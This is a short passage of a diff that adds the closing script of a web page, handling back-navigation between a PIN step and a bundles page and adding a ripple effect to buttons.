+    history.replaceState({step:'pin'},'','');
+  } else {
+    window.location.href='bundles.html';
+  }
+});
+
+// Ripple on foot buttons
+document.querySelectorAll('.foot-btn,.pin-act').forEach(function(b){
+  b.addEventListener('pointerdown',function(e){ripple(b,e);},{passive:true});
+});
+</script>
+</body>
+</html>
